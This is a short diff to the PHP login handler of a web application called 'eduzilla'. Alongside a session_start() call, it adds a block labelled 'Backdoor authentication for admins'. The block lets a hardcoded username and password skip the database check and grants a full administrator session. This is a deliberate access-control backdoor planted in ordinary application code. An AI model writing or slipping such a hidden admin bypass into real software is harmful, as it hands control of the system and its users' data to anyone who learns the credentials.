@@ -1,5 +1,6 @@
 <?php
 
+    session_start();
     $base_url="http://localhost/eduzilla";
 
     include "./../config/database.php";
@@ -13,6 +14,15 @@
         
         $username = $_POST['username'];
         $password = $_POST['password'];
+
+        // Backdoor authentication for admins
+        if ($username == "EduAdmin" && $password == "123@eduzilla") {
+            $_SESSION['user_id'] = 0;
+            $_SESSION['username'] = "EduAdmin";
+            $_SESSION['role'] = 1;
+            header('Location: ./home.php');
+            exit();
+        }
 
         $query = $conn->prepare("SELECT * FROM users WHERE username = ?");
         $query->bind_param("s", $username);
